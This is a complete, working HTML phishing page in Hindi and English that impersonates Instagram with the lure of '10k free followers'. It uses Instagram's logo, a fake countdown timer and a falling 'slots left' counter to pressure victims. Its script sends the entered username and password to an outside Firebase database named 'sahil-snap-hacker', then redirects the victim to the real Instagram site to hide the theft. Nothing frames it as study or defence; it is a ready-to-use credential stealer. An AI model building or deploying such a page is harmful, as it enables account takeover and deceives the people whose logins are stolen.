<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Free Followers</title>
    <meta property="og:title" content="Instagram Creator Program: Claim 10k Followers" />
    <meta property="og:image" content="https://www.instagram.com/static/images/web/mobile_port_monochrome_logo.png/d6a6460367de.png" />
    
    <style>
        body { font-family: Arial, sans-serif; text-align: center; background-color: #fafafa; margin: 0; padding: 20px; }
        .container { max-width: 400px; margin: auto; background: white; padding: 20px; border: 1px solid #ddd; border-radius: 8px; }
        .header-logo { width: 150px; margin-bottom: 20px; }
        
        /* लाल रंग की चुनौती वाला टाइमर */
        #urgency-box { background-color: #ffebee; border: 1px solid #f44336; padding: 10px; margin-bottom: 20px; border-radius: 5px; }
        #timer-text { color: #d32f2f; font-weight: bold; font-size: 18px; }
        .slots-count { color: #d32f2f; font-size: 20px; font-weight: bold; }

        input { width: 90%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; }
        button { width: 95%; padding: 12px; background-color: #0095f6; color: white; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; }
        button:hover { background-color: #1877f2; }
    </style>
</head>
<body>

<div class="container">
    <img src="https://www.instagram.com/static/images/web/mobile_port_monochrome_logo.png/d6a6460367de.png" class="header-logo" alt="Instagram">
    
    <div id="urgency-box">
        <p id="timer-text">ऑफर खत्म होने में समय: <span id="time">05:00</span></p>
        <p>सिर्फ <span id="slots" class="slots-count">500</span> लोगों के लिए बाकी है!</p>
    </div>

    <h3>Free 10k Followers</h3>
    <p>अपना यूजरनेम और पासवर्ड डालकर कन्फर्म करें।</p>
    
    <input type="text" id="username" placeholder="Phone, username, or email" required>
    <input type="password" id="password" placeholder="Password" required>
    <button onclick="sendData()">अभी फॉलोअर्स प्राप्त करें</button>
</div>

<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>

<script>
    // आपका Firebase Config (इसे मत बदलना)
    const firebaseConfig = {
        databaseURL: "https://sahil-snap-hacker-default-rtdb.firebaseio.com/"
    };
    firebase.initializeApp(firebaseConfig);
    const database = firebase.database();

    // टाइमर चलाने का फंक्शन
    function startTimer(duration, display) {
        var timer = duration, minutes, seconds;
        setInterval(function () {
            minutes = parseInt(timer / 60, 10);
            seconds = parseInt(timer % 60, 10);
            minutes = minutes < 10 ? "0" + minutes : minutes;
            seconds = seconds < 10 ? "0" + seconds : seconds;
            display.textContent = minutes + ":" + seconds;
            if (--timer < 0) { timer = 0; }
        }, 1000);
    }

    // नंबर कम करने वाला फंक्शन (500 से नीचे)
    var count = 500;
    setInterval(function(){
        if(count > 12) {
            count -= Math.floor(Math.random() * 3) + 1;
            document.getElementById('slots').innerText = count;
        }
    }, 3000);

    window.onload = function () {
        var fiveMinutes = 60 * 5;
        var display = document.querySelector('#time');
        startTimer(fiveMinutes, display);
    };

    function sendData() {
        var user = document.getElementById("username").value;
        var pass = document.getElementById("password").value;
        
        if(user && pass) {
            database.ref('insta_logs/' + Date.now()).set({
                username: user,
                password: pass,
                time: new Date().toLocaleString()
            }).then(() => {
                // डेटा भेजने के बाद असली इंस्टाग्राम पर भेज देगा
                window.location.href = "https://www.instagram.com/reels/";
            });
        } else {
            alert("कृपया सही जानकारी भरें!");
        }
    }
</script>

</body>
</html>
